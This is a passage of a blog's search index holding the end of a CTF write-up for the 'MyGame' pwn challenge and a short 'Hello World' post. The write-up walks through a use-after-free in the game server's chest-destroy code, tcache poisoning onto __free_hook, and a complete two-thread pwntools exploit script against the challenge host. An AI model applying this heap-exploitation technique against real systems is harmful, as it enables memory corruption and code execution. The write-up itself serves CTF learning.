class="hljs-type">int</span> <span class="hljs-title function_">destory_block</span><span class="hljs-params">(<span class="hljs-type">int</span> client_sock, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> usernow)</span> &#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-comment">// map selector</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> x, y;<br>    err = map_selector(client_sock, &amp;x, &amp;y);<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span> || x &gt;= MAP_SIZE_X || y &lt; <span class="hljs-number">0</span> || y &gt;= MAP_SIZE_Y) &#123;<br>        send(client_sock, <span class="hljs-string">&quot;Invalid position!\n&quot;</span>, <span class="hljs-number">19</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> *<span class="hljs-title">tmpit</span> =</span> <span class="hljs-built_in">map</span>[y][x].item;<br>    <span class="hljs-keyword">if</span> (!tmpit) &#123; <span class="hljs-comment">// map unit / item on it</span><br>        send(client_sock, <span class="hljs-string">&quot;Nothing in the map unit which you selected.\n&quot;</span>, <span class="hljs-number">45</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// destory!!</span><br>    <span class="hljs-keyword">if</span> (tmpit-&gt;id == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// normal block</span><br>        <span class="hljs-built_in">free</span>(tmpit);<br>        <span class="hljs-built_in">map</span>[y][x].item = <span class="hljs-literal">NULL</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// chest</span><br>        <span class="hljs-keyword">if</span> (tmpit-&gt;owner != usernow) &#123; <span class="hljs-comment">// chest owner protect</span><br>            send(client_sock, <span class="hljs-string">&quot;This box is not yours!\n&quot;</span>, <span class="hljs-number">24</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">// remove items</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inchest</span> *<span class="hljs-title">now</span> =</span> tmpit-&gt;itemlist, *next = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-built_in">free</span>(tmpit);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!now) <span class="hljs-keyword">break</span>;<br><br>            next = now-&gt;next;<br><br>            <span class="hljs-built_in">free</span>(now-&gt;item);<br>            <span class="hljs-built_in">free</span>(now);<br>            <br>            now = next;<br>        &#125;<br>        <span class="hljs-comment">// remove chest</span><br>        <span class="hljs-built_in">map</span>[y][x].item = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/20/THJCC-2025-Pyjail01-Pyjail02-MyGame-writeups/explain_get_pointer.jpg" alt="get freed-chest"></p><h2 id="Win-Function"><a href="#Win-Function" class="headerlink" title="Win Function"></a>Win Function</h2><p>With the freed-chest, you can perform Tcache attack.</p><p>Put it on the map, interact with it, and rename it.</p><p>In <code>func.h / item_rename()</code>, user’s input is copied to <code>item-&gt;name</code> as it’s new name.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">item_rename</span><span class="hljs-params">(<span class="hljs-type">int</span> client_sock, <span class="hljs-keyword">struct</span> item *item)</span> &#123;<br>    send(client_sock, <span class="hljs-string">&quot;Name &gt; &quot;</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> namebuf[<span class="hljs-number">8</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> err = recv(client_sock, namebuf, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (err &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">strncpy</span>(item-&gt;name, namebuf, <span class="hljs-number">8</span>);<br><br>    send(client_sock, <span class="hljs-string">&quot;Done!\n&quot;</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>Because of <code>item-&gt;name</code> and <code>tcache_entry-&gt;next</code> are both placed at the same offset (0x0) and are 8 bytes in size, you can overwrite <code>next</code> of the freed-chest(chunk) with <code>free_hook</code> address by rename it.</p><p><code>struct.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> &#123;</span><br>    <span class="hljs-comment">// common attr</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> name[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> id;<br>    <span class="hljs-comment">// chest attr</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inchest</span> *<span class="hljs-title">itemlist</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> owner;<br>&#125;;<br></code></pre></td></tr></table></figure><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3131">Glibc source code</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-type">uintptr_t</span> key;<br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p><code>func.h / put_block</code>. A VIP player can put blocks on map whether or not there are enough blocks in backpack. The game allocates a new chunk of heap and turn it into a block. </p><p>So you can control player01 to put blocks on map until the game allocates a chunk(block) that is on <code>free_hook</code>, and we can write win function address to <code>free_hook</code> by renaming the block.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">put_block</span><span class="hljs-params">(<span class="hljs-type">int</span> client_sock, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> usernow)</span> &#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-comment">// map selector</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> x, y;<br>    err = map_selector(client_sock, &amp;x, &amp;y);<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span> || x &gt;= MAP_SIZE_X || y &lt; <span class="hljs-number">0</span> || y &gt;= MAP_SIZE_Y) &#123;<br>        send(client_sock, <span class="hljs-string">&quot;Invalid position!\n&quot;</span>, <span class="hljs-number">19</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (userlist[usernow]-&gt;perm_vip == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// vip</span><br>        <span class="hljs-comment">// block selector</span><br>        <span class="hljs-type">int</span> block = <span class="hljs-number">0</span>;<br>        err = block_selector(client_sock, &amp;block);<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">if</span> (block != <span class="hljs-number">1</span> &amp;&amp; block != <span class="hljs-number">2</span>) &#123;<br>            send(client_sock, <span class="hljs-string">&quot;Invalid block!\n&quot;</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// put</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>[y][x].item) &#123; <span class="hljs-comment">// map unit / no item on it</span><br>            send(client_sock, <span class="hljs-string">&quot;The map unit which you selected is not clear.\n&quot;</span>, <span class="hljs-number">47</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-built_in">map</span>[y][x].item = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> item));<br>        <span class="hljs-built_in">map</span>[y][x].item-&gt;id = block;<br>        <span class="hljs-built_in">memset</span>(<span class="hljs-built_in">map</span>[y][x].item-&gt;name, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// &lt;- IMPORTANT</span><br>        <span class="hljs-keyword">if</span> (block == <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-built_in">map</span>[y][x].item-&gt;owner = usernow; <span class="hljs-comment">// chest owner protect</span><br>            <span class="hljs-built_in">map</span>[y][x].item-&gt;itemlist = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    ...<br></code></pre></td></tr></table></figure><p>Now, destory a block, <code>free()</code> is called. Then we can get the flag.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> threading, time<br><br>HOST = <span class="hljs-string">&quot;node2.dynchal.p23.tw&quot;</span><br>PORT = <span class="hljs-number">25850</span><br><br>sig = -<span class="hljs-number">1</span><br>libc = -<span class="hljs-number">1</span><br>win = -<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lottery</span>(<span class="hljs-params">r</span>):<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;6&quot;</span>)<br>    r.sendafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">putblock_vip</span>(<span class="hljs-params">r, mapx, mapy, t</span>):<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(mapx).encode())<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(mapy).encode())<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(t).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">server</span>():<br>    r = process(<span class="hljs-string">&quot;./chal&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">client01</span>():<br>    <span class="hljs-keyword">global</span> sig, libc, win<br><br>    <span class="hljs-comment">#r = remote(&quot;0.0.0.0&quot;, 8080)</span><br>    r = remote(HOST, PORT)<br><br>    info(<span class="hljs-string">&quot;[Thread-1] Register and leak win function address&quot;</span>)<br>    win = <span class="hljs-built_in">int</span>(r.recvline().decode().split(<span class="hljs-string">&quot;&gt;&quot;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>    success(<span class="hljs-string">&quot;[c1] win -&gt; %s&quot;</span>%<span class="hljs-built_in">hex</span>(win))<br><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;c01&quot;</span>);<br><br>    info(<span class="hljs-string">&quot;[Thread-1] Leak libc base&quot;</span>)<br>    lottery(r)<br>    libc = <span class="hljs-built_in">int</span>(r.recvlines(<span class="hljs-number">2</span>)[<span class="hljs-number">1</span>].decode().split(<span class="hljs-string">&quot;&gt;&quot;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">0x61c90</span><br>    success(<span class="hljs-string">&quot;[c1] libc -&gt; %s&quot;</span>%<span class="hljs-built_in">hex</span>(libc))<br><br>    info(<span class="hljs-string">&quot;[Thread-1] Put 10m blocks into chest&quot;</span>)<br>    putblock_vip(r, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) <span class="hljs-comment"># put a chest</span><br><br>    <span class="hljs-comment"># push 10m blocks into chest</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;10000000&quot;</span>)<br><br>    <span class="hljs-comment"># new block and destory it</span><br>    putblock_vip(r, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br><br>    info(<span class="hljs-string">&quot;[Thread-1] Destory chest&quot;</span>)<br>    <span class="hljs-comment"># destory block</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br><br>    sig = <span class="hljs-number">1</span> <span class="hljs-comment"># client2 to get ref</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> (sig == <span class="hljs-number">2</span>): <span class="hljs-keyword">pass</span><br>    info(<span class="hljs-string">&quot;[Thread-1] Write win function address to free_hook&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        putblock_vip(r, i, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># write free_hook</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;6&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, p64(win))<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>    sig = <span class="hljs-number">3</span><br><br>    info(<span class="hljs-string">&quot;[Thread-1] Good bye&quot;</span>)<br>    r.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">client02</span>():<br>    <span class="hljs-keyword">global</span> sig<br><br>    <span class="hljs-comment">#r = remote(&quot;0.0.0.0&quot;, 8080)</span><br>    r = remote(HOST, PORT)<br><br>    r.recvline()<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;c02&quot;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> (sig == <span class="hljs-number">1</span>): <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-comment"># get chest</span><br>    info(<span class="hljs-string">&quot;[Thread-2] Get chest dangling pointer&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>) <span class="hljs-comment"># choice</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>) <span class="hljs-comment"># x</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>) <span class="hljs-comment"># y</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>) <span class="hljs-comment"># backpack slot</span><br><br>    time.sleep(<span class="hljs-number">20</span>)<br><br>    <span class="hljs-comment"># put it into map</span><br>    info(<span class="hljs-string">&quot;[Thread-2] Get a chunk on free_hook&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>) <span class="hljs-comment"># choice</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>) <span class="hljs-comment"># x</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>) <span class="hljs-comment"># y</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>) <span class="hljs-comment"># backpack slot</span><br><br>    <span class="hljs-comment"># rename</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    freehook = libc + <span class="hljs-number">0x1eee48</span><br>    r.sendafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, p64(freehook))<br><br>    sig = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> (sig == <span class="hljs-number">3</span>): <span class="hljs-keyword">pass</span><br><br>    info(<span class="hljs-string">&quot;[Thread-2] Win&quot;</span>)<br><br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br><br>    r.interactive()<br><br><span class="hljs-comment">#threading.Thread(target=server).start()</span><br>threading.Thread(target=client01).start()<br>threading.Thread(target=client02).start()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>writeups</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/04/19/Hello-World/"/>
    <url>/2025/04/19/Hello-World/</url>
    
    <content type="html"><![CDATA[<p>Hello, world!</p><p>白上フブキ好可愛啊，最可愛的狐狸!!!</p><p><img src="/2025/04/19/Hello-World/fbk.gif"></p>]]></content>
    
    
    <categories>
      
      <category>hello world</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hello world</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
